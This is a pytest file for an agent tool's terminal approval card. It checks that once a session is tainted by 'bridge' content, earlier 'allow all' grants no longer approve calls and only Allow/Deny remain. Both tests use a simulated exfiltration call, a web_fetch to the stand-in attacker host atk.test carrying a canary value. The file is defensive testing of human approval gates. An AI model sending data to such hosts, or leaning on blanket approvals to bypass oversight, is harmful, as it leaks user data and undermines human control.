"""The TUI approval card in a Team-Bridge-latched session (team-bridge-egress.md: "Cards",
"Grants").

Drives the REAL app and the gate it installs on the session, the way a tool
call reaches it. Rows: T22 (Allow/Deny only; ``A``, ``S``, ``G`` inert -- no
setting written, no record), T22c/T22d (a pre-latch ``A`` does not approve a
call once the session latches), and the clean control (a session without
bridge content keeps its three answers and its escapes).
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from local_operator.paths import CONFIG_DIR_ENV
from local_operator.tui.app import OperatorApp
from tests.unit.tui.test_app_pilot import _factory
from tests.unit.tui.test_approvals_ux import GatedSession, _boot, _gate, _wait_prompt


@pytest.fixture
def config_dir(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    monkeypatch.setenv(CONFIG_DIR_ENV, str(tmp_path))
    return tmp_path


def _labels(app: OperatorApp) -> list[str]:
    card = app._approval
    assert card is not None, "no card is on screen"
    return [option.label for option in card._questions[0].options]


@pytest.mark.asyncio
async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_escape(
    config_dir: Path,
) -> None:
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        # Clean session: three answers; the operator presses A on a bash card.
        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        await pilot.press("A")
        assert await first is True
        assert app._approve_all is True
        assert await gate("bash", "ls again") is True  # covered while clean

        # A bridge card arrives: the session latches.
        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch allow-all approved tainted egress"
        assert _labels(app) == ["Allow", "Deny"]
        records_before = sorted(p.name for p in config_dir.rglob("*"))
        for key in ("A", "S", "G"):
            await pilot.press(key)
            await pilot.pause()
            assert not tainted.done(), f"{key} answered a latched card"
        assert sorted(p.name for p in config_dir.rglob("*")) == records_before
        await pilot.press("n")
        assert await tainted is False


@pytest.mark.asyncio
async def test_t22d_iv_a_pre_latch_card_g_is_a_session_grant_in_the_issuing_session(
    config_dir: Path,
) -> None:
    """Review S-61: the card's ``G`` sets the machine default to auto, but in
    the conversation that pressed it the grant is a SESSION grant (as the
    desktop's "All sessions" already is), so it stops covering calls once
    this conversation latches."""
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        await pilot.press("G")
        await pilot.pause()
        if not first.done():
            await pilot.press("y")
        assert await first is True
        assert app._approve_all is True
        assert app._interaction.draft.approve_scope == "session"
        assert await gate("bash", "ls again") is True  # covered while clean

        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch card G approved latched egress"
        await pilot.press("n")
        assert await tainted is False
